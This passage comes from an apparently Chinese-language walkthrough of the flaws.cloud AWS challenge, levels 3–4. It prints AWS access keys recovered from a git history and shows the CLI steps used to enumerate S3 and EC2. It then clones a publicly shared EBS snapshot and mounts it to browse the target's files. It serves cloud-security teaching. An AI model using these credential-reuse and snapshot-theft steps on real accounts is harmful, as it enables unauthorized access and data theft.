+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">~\testtest$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61</span><br><span class="line"></span><br><span class="line">Note: checking out &#x27;f52ec03b227ea6094b04e43f475fb0126edb5a61&#x27;.</span><br><span class="line"></span><br><span class="line">You are in &#x27;detached HEAD&#x27; state. You can look around, make experimental</span><br><span class="line">changes and commit them, and you can discard any commits you make in this</span><br><span class="line">state without impacting any branches by performing another checkout.</span><br><span class="line"></span><br><span class="line">If you want to create a new branch to retain commits you create, you may</span><br><span class="line">do so (now or later) by using -b with the checkout command again. Example:</span><br><span class="line"></span><br><span class="line">  git checkout -b &lt;new-branch-name&gt;</span><br><span class="line"></span><br><span class="line">HEAD is now at f52ec03 first commit</span><br></pre></td></tr></table></figure>
+
+<p>再次查看目录中包含的文件，发现<code>access_keys.txt</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/testtest$ ls</span><br><span class="line"></span><br><span class="line">access_keys.txt  authenticated_users.png  hint1.html  hint2.html  hint3.html </span><br></pre></td></tr></table></figure>
+
+<p>查看<code>access_keys.txt</code>的内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~/testtest$ cat access_keys.txt</span><br><span class="line"></span><br><span class="line">access_key AKIAJ366LIPB4IJKT7SA</span><br><span class="line">secret_access_key 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</span><br></pre></td></tr></table></figure>
+
+<p>用获得的<code>access_keys</code>配置AWS CLI：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~/testtest$ aws configure --profile flaws</span><br><span class="line">AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA</span><br><span class="line">AWS Secret Access Key [None]: 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</span><br><span class="line">Default region name [None]: us-west-2</span><br><span class="line">Default output format [None]:</span><br></pre></td></tr></table></figure>
+
+<p>用这个账户权限看看S3存储桶中有什么有意思的内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 ls --profile flaws</span><br><span class="line"></span><br><span class="line">2017-02-19 03:41:52 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud</span><br><span class="line">2017-05-30 00:34:53 config-bucket-975426262029</span><br><span class="line">2018-07-08 00:09:49 flaws-logs</span><br><span class="line">2017-02-19 03:40:54 flaws.cloud</span><br><span class="line">2017-02-24 13:15:42 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</span><br><span class="line">2017-02-27 02:29:03 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</span><br><span class="line">2017-02-27 02:49:31 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</span><br><span class="line">2017-02-27 03:49:03 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud</span><br><span class="line">2017-02-27 03:48:40 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</span><br><span class="line">2017-02-27 04:07:13 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud</span><br></pre></td></tr></table></figure>
+
+<p>成功通关level 3，并找到level 4的入口。</p>
+<h2 id="0x04-Level-1-3-小结"><a href="#0x04-Level-1-3-小结" class="headerlink" title="0x04 Level 1-3 小结"></a>0x04 Level 1-3 小结</h2><p>至此，涉及到S3存储桶的挑战（level 1-3）已经全部通关，这里进行一个小结：</p>
+<p>在AWS中，可以在S3存桶中可以配置各种权限的功能，包括用来托管静态网站。如果使用了过于宽松的权限，比如将访问权限设置为<code>Everyone</code>，就有可能像访问Web服务器目录列表一样访问S3存储桶的列表，就可能造成信息泄露。hackone平台上的几个类似的漏洞报告，包括针对Shopify、Udemy等厂家的S3文件目录暴露，读写S3的权限等：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/163476">https://hackerone.com/reports/163476</a> ，<a target="_blank" rel="noopener" href="https://hackerone.com/reports/57505">https://hackerone.com/reports/57505</a> ，<a target="_blank" rel="noopener" href="https://hackerone.com/reports/111643">https://hackerone.com/reports/111643</a> ，<a target="_blank" rel="noopener" href="https://hackerone.com/reports/131468">https://hackerone.com/reports/131468</a> 。</p>
+<p>如果出现的了将访问权限错误的这是为<code>Any Authenticated AWS User</code>，即任何身份认证的AWS用户，而错误的认为这只是对自己的其他用户开放，依然会造成一个跨权限的访问。这里给出hackerone平台上针对Shopify的一个漏洞报告进行参考：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/98819">https://hackerone.com/reports/98819</a> 。</p>
+<p>AWS秘钥泄露时常出现，这里提供一篇关于Instagram的百万美元的漏洞文章进行学习——Instagram’s Million Dollar Bug：<a target="_blank" rel="noopener" href="http://www.exfiltrated.com/research-Instagram-RCE.php">http://www.exfiltrated.com/research-Instagram-RCE.php</a> 。这篇文章中，安全研究员发现了一系列缺陷，包括一个S3桶，其中包含.tar.gz存档的各种修订文件，而其中一个档案包含了<code>AWS credentials</code>，使得研究人员访问所Instagram所有的S3存储桶。</p>
+<h2 id="0x05-Level-4"><a href="#0x05-Level-4" class="headerlink" title="0x05 Level 4"></a>0x05 Level 4</h2><blockquote>
+<p>For the next level, you need to get access to the web page running on an EC2 at <a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</a></p>
+<p>It’ll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.</p>
+</blockquote>
+<p>我们的目标是进入<code>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</code>，直接用浏览器打开，提示需要账号密码：</p>
+<p><img src="https://p4.ssl.qhimg.com/t01702b4808c239fe1a.png" srcset="/img/loading.gif"></p>
+<p><img src="https://p1.ssl.qhimg.com/t01cd5df690a898e118.png" srcset="/img/loading.gif"></p>
+<p>在level 4 挑战的描述中，我们知道，当nginx在EC2上部署后，会创建一个快照（EBS snapshot）。由这一思路出发，利用level 3中取得的账户查询flaws上运行的EC2实例的信息:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 describe-instances --profile flaws</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Reservations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Instances&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Monitoring&quot;: &#123;</span><br><span class="line">                        &quot;State&quot;: &quot;disabled&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;PublicDnsName&quot;: &quot;ec2-35-165-182-7.us-west-2.compute.amazonaws.com&quot;,</span><br><span class="line">                    &quot;StateReason&quot;: &#123;</span><br><span class="line">                        &quot;Message&quot;: &quot;&quot;,</span><br><span class="line">                        &quot;Code&quot;: &quot;&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;State&quot;: &#123;</span><br><span class="line">                        &quot;Code&quot;: 16,</span><br><span class="line">                        &quot;Name&quot;: &quot;running&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;EbsOptimized&quot;: false,</span><br><span class="line">                    &quot;LaunchTime&quot;: &quot;2017-02-12T22:29:24.000Z&quot;,</span><br><span class="line">                    &quot;PublicIpAddress&quot;: &quot;35.165.182.7&quot;,</span><br><span class="line">                    &quot;PrivateIpAddress&quot;: &quot;172.31.41.84&quot;,</span><br><span class="line">                    &quot;ProductCodes&quot;: [],</span><br><span class="line">                    &quot;VpcId&quot;: &quot;vpc-1052ce77&quot;,</span><br><span class="line">                    &quot;CpuOptions&quot;: &#123;</span><br><span class="line">                        &quot;CoreCount&quot;: 1,</span><br><span class="line">                        &quot;ThreadsPerCore&quot;: 1</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;StateTransitionReason&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;InstanceId&quot;: &quot;i-05bef8a081f307783&quot;,</span><br><span class="line">                    &quot;ImageId&quot;: &quot;ami-7c803d1c&quot;,</span><br><span class="line">                    &quot;PrivateDnsName&quot;: &quot;ip-172-31-41-84.us-west-2.compute.internal&quot;,</span><br><span class="line">                    &quot;KeyName&quot;: &quot;Default&quot;,</span><br><span class="line">                    &quot;SecurityGroups&quot;: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            &quot;GroupName&quot;: &quot;launch-wizard-1&quot;,</span><br><span class="line">                            &quot;GroupId&quot;: &quot;sg-490f6631&quot;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                    &quot;ClientToken&quot;: &quot;kTOiC1486938563883&quot;,</span><br><span class="line">                    &quot;SubnetId&quot;: &quot;subnet-d962aa90&quot;,</span><br><span class="line">                    &quot;InstanceType&quot;: &quot;t2.micro&quot;,</span><br><span class="line">                    &quot;CapacityReservationSpecification&quot;: &#123;</span><br><span class="line">                        &quot;CapacityReservationPreference&quot;: &quot;open&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;NetworkInterfaces&quot;: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            &quot;Status&quot;: &quot;in-use&quot;,</span><br><span class="line">                            &quot;MacAddress&quot;: &quot;06:b0:7a:92:21:cf&quot;,</span><br><span class="line">                            &quot;SourceDestCheck&quot;: true,</span><br><span class="line">                            &quot;VpcId&quot;: &quot;vpc-1052ce77&quot;,</span><br><span class="line">                            &quot;Description&quot;: &quot;&quot;,</span><br><span class="line">                            &quot;NetworkInterfaceId&quot;: &quot;eni-c26ed780&quot;,</span><br><span class="line">                            &quot;PrivateIpAddresses&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    &quot;PrivateDnsName&quot;: &quot;ip-172-31-41-84.us-west-2.compute.internal&quot;,</span><br><span class="line">                                    &quot;PrivateIpAddress&quot;: &quot;172.31.41.84&quot;,</span><br><span class="line">                                    &quot;Primary&quot;: true,</span><br><span class="line">                                    &quot;Association&quot;: &#123;</span><br><span class="line">                                        &quot;PublicIp&quot;: &quot;35.165.182.7&quot;,</span><br><span class="line">                                        &quot;PublicDnsName&quot;: &quot;ec2-35-165-182-7.us-west-2.compute.amazonaws.com&quot;,</span><br><span class="line">                                        &quot;IpOwnerId&quot;: &quot;amazon&quot;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            ],</span><br><span class="line">                            &quot;PrivateDnsName&quot;: &quot;ip-172-31-41-84.us-west-2.compute.internal&quot;,</span><br><span class="line">                            &quot;InterfaceType&quot;: &quot;interface&quot;,</span><br><span class="line">                            &quot;Attachment&quot;: &#123;</span><br><span class="line">                                &quot;Status&quot;: &quot;attached&quot;,</span><br><span class="line">                                &quot;DeviceIndex&quot;: 0,</span><br><span class="line">                                &quot;DeleteOnTermination&quot;: true,</span><br><span class="line">                                &quot;AttachmentId&quot;: &quot;eni-attach-a4901fc2&quot;,</span><br><span class="line">                                &quot;AttachTime&quot;: &quot;2017-02-12T22:29:24.000Z&quot;</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;Groups&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    &quot;GroupName&quot;: &quot;launch-wizard-1&quot;,</span><br><span class="line">                                    &quot;GroupId&quot;: &quot;sg-490f6631&quot;</span><br><span class="line">                                &#125;</span><br><span class="line">                            ],</span><br><span class="line">                            &quot;Ipv6Addresses&quot;: [],</span><br><span class="line">                            &quot;OwnerId&quot;: &quot;975426262029&quot;,</span><br><span class="line">                            &quot;PrivateIpAddress&quot;: &quot;172.31.41.84&quot;,</span><br><span class="line">                            &quot;SubnetId&quot;: &quot;subnet-d962aa90&quot;,</span><br><span class="line">                            &quot;Association&quot;: &#123;</span><br><span class="line">                                &quot;PublicIp&quot;: &quot;35.165.182.7&quot;,</span><br><span class="line">                                &quot;PublicDnsName&quot;: &quot;ec2-35-165-182-7.us-west-2.compute.amazonaws.com&quot;,</span><br><span class="line">                                &quot;IpOwnerId&quot;: &quot;amazon&quot;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                    &quot;SourceDestCheck&quot;: true,</span><br><span class="line">                    &quot;Placement&quot;: &#123;</span><br><span class="line">                        &quot;Tenancy&quot;: &quot;default&quot;,</span><br><span class="line">                        &quot;GroupName&quot;: &quot;&quot;,</span><br><span class="line">                        &quot;AvailabilityZone&quot;: &quot;us-west-2a&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;Hypervisor&quot;: &quot;xen&quot;,</span><br><span class="line">                    &quot;BlockDeviceMappings&quot;: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            &quot;DeviceName&quot;: &quot;/dev/sda1&quot;,</span><br><span class="line">                            &quot;Ebs&quot;: &#123;</span><br><span class="line">                                &quot;Status&quot;: &quot;attached&quot;,</span><br><span class="line">                                &quot;DeleteOnTermination&quot;: true,</span><br><span class="line">                                &quot;VolumeId&quot;: &quot;vol-04f1c039bc13ea950&quot;,</span><br><span class="line">                                &quot;AttachTime&quot;: &quot;2017-02-12T22:29:25.000Z&quot;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                    &quot;Architecture&quot;: &quot;x86_64&quot;,</span><br><span class="line">                    &quot;RootDeviceType&quot;: &quot;ebs&quot;,</span><br><span class="line">                    &quot;IamInstanceProfile&quot;: &#123;</span><br><span class="line">                        &quot;Id&quot;: &quot;AIPAIK7LV6U6UXJXQQR3Q&quot;,</span><br><span class="line">                        &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:instance-profile/flaws&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;RootDeviceName&quot;: &quot;/dev/sda1&quot;,</span><br><span class="line">                    &quot;VirtualizationType&quot;: &quot;hvm&quot;,</span><br><span class="line">                    &quot;HibernationOptions&quot;: &#123;</span><br><span class="line">                        &quot;Configured&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;MetadataOptions&quot;: &#123;</span><br><span class="line">                        &quot;State&quot;: &quot;applied&quot;,</span><br><span class="line">                        &quot;HttpEndpoint&quot;: &quot;enabled&quot;,</span><br><span class="line">                        &quot;HttpTokens&quot;: &quot;optional&quot;,</span><br><span class="line">                        &quot;HttpPutResponseHopLimit&quot;: 1</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;AmiLaunchIndex&quot;: 0</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ReservationId&quot;: &quot;r-0fe151dbbe77e90cc&quot;,</span><br><span class="line">            &quot;Groups&quot;: [],</span><br><span class="line">            &quot;OwnerId&quot;: &quot;975426262029&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在返回的信息中，在<code>EBS</code>中找到<code>VolumeId</code>，在<code>Association</code>中找到公有IP</p>
+<p><img src="https://p5.ssl.qhimg.com/t01cb1c4ac118142b80.png" srcset="/img/loading.gif"></p>
+<p><img src="https://p0.ssl.qhimg.com/t01dab8ab43585c552b.png" srcset="/img/loading.gif"></p>
+<p>也就是说，有一个EC2实例在运行，它的<code>VolumeId</code>为<code>vol-04f1c039bc13ea950</code>，IP地址为<code>35.165.182.7</code>。</p>
+<p>为了确认这一发现，利用<code>nslookup</code>工具对level 4中的EC2地址进行解析，发现IP对应一致：</p>
+<p><img src="https://p1.ssl.qhimg.com/t01e8a1ea1ccebfd490.png" srcset="/img/loading.gif"></p>
+<p>那么，下一步要做到的就是通过<code>VolumeId</code>寻找EBS快照，看看能不能发现有用的信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 describe-snapshots --filters &quot;Name=volume-id, Values=vol-04f1c039bc13ea950&quot; --profile flaws</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Snapshots&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Description&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Tags&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Value&quot;: &quot;flaws backup 2017.02.27&quot;,</span><br><span class="line">                    &quot;Key&quot;: &quot;Name&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Encrypted&quot;: false,</span><br><span class="line">            &quot;VolumeId&quot;: &quot;vol-04f1c039bc13ea950&quot;,</span><br><span class="line">            &quot;State&quot;: &quot;completed&quot;,</span><br><span class="line">            &quot;VolumeSize&quot;: 8,</span><br><span class="line">            &quot;StartTime&quot;: &quot;2017-02-28T01:35:12.000Z&quot;,</span><br><span class="line">            &quot;Progress&quot;: &quot;100%&quot;,</span><br><span class="line">            &quot;OwnerId&quot;: &quot;975426262029&quot;,</span><br><span class="line">            &quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里找到<code>&quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;</code>，接着检查这个快照的<code>createVolumePermission</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;,</span><br><span class="line">    &quot;CreateVolumePermissions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Group&quot;: &quot;all&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>哇偶！每个人都能基于这个快照创建一个卷。那么现在就使用自己的AWS账号创建这个快照的卷，这样就能使用自己的SSH秘钥登录EC2实例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 create-volume --region us-west-2 --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;AvailabilityZone&quot;: &quot;us-west-2a&quot;,</span><br><span class="line">    &quot;MultiAttachEnabled&quot;: false,</span><br><span class="line">    &quot;Tags&quot;: [],</span><br><span class="line">    &quot;Encrypted&quot;: false,</span><br><span class="line">    &quot;VolumeType&quot;: &quot;gp2&quot;,</span><br><span class="line">    &quot;VolumeId&quot;: &quot;vol-00b0a21eafbe8f81b&quot;,</span><br><span class="line">    &quot;State&quot;: &quot;creating&quot;,</span><br><span class="line">    &quot;Iops&quot;: 100,</span><br><span class="line">    &quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;,</span><br><span class="line">    &quot;CreateTime&quot;: &quot;2020-03-22T08:43:49.000Z&quot;,</span><br><span class="line">    &quot;Size&quot;: 8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在我自己账户的EC2管理平台上，可以看到基于这个快照的卷成功创建：</p>
+<p><img src="https://p0.ssl.qhimg.com/t0146400bfcb5c37686.png" srcset="/img/loading.gif"></p>
+<p>随后我开启了一个免费的EC2实例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 describe-instances</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &quot;InstanceId&quot;: &quot;i-056b17b87e47e8896&quot;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面将卷挂载在/dev/sdf：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 attach-volume --volume-id vol-00b0a21eafbe8f81b --instance-id i-056b17b87e47e8896 --device /dev/sdf</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    &quot;State&quot;: &quot;attaching&quot;,</span><br><span class="line">    &quot;Device&quot;: &quot;/dev/sdf&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们用自己的SSH秘钥登录这个EC2实例，就能进入快照找寻敏感信息或者文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~$ ssh -i &lt;mykey&gt; ubuntu@34.*.*.*.*</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-1057-aws x86_64)Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-1057-aws x86_64)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ubuntu@ip-172-31-21-33:~$ lsblk</span><br><span class="line">NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0     7:0    0 89.1M  1 loop /snap/core/8268</span><br><span class="line">loop1     7:1    0   18M  1 loop /snap/amazon-ssm-agent/1480</span><br><span class="line">xvda    202:0    0    8G  0 disk</span><br><span class="line">└─xvda1 202:1    0    8G  0 part /</span><br><span class="line">xvdf    202:80   0    8G  0 disk</span><br><span class="line">└─xvdf1 202:81   0    8G  0 part</span><br></pre></td></tr></table></figure>
+
+<p>可以发现这里有个虚拟盘/dev/xvdf1，创建一个挂载点：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:~$ sudo mkdir /mnt/flaws</span><br><span class="line">ubuntu@ip-172-31-21-33:~$ sudo mount /dev/xvdf1 /mnt/flaws</span><br><span class="line">ubuntu@ip-172-31-21-33:~$ mount</span><br><span class="line">...</span><br><span class="line">/dev/xvdf1 on /mnt/flaws type ext4 (rw,relatime,data=ordered)</span><br></pre></td></tr></table></figure>
+
+<p>下面进入，看看能发现什么：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:~$ ls -l /mnt/flaws/</span><br><span class="line">total 104</span><br><span class="line">drwxr-xr-x  2 root root  4096 Feb 13  2017 bin</span><br><span class="line">drwxr-xr-x  3 root root  4096 Feb 22  2017 boot</span><br><span class="line">drwxr-xr-x  5 root root  4096 Jan 13  2017 dev</span><br><span class="line">drwxr-xr-x 94 root root  4096 Feb 19  2017 etc</span><br><span class="line">drwxr-xr-x  3 root root  4096 Feb 12  2017 home</span><br><span class="line">lrwxrwxrwx  1 root root    32 Feb 22  2017 initrd.img -&gt; boot/initrd.img-4.4.0-64-generic</span><br><span class="line">lrwxrwxrwx  1 root root    32 Feb 21  2017 initrd.img.old -&gt; boot/initrd.img-4.4.0-63-generic</span><br><span class="line">drwxr-xr-x 21 root root  4096 Jan 13  2017 lib</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 lib64</span><br><span class="line">drwx------  2 root root 16384 Jan 13  2017 lost+found</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 media</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 mnt</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 opt</span><br><span class="line">drwxr-xr-x  2 root root  4096 Apr 12  2016 proc</span><br><span class="line">drwx------  3 root root  4096 Feb 19  2017 root</span><br><span class="line">drwxr-xr-x  6 root root  4096 Jan 13  2017 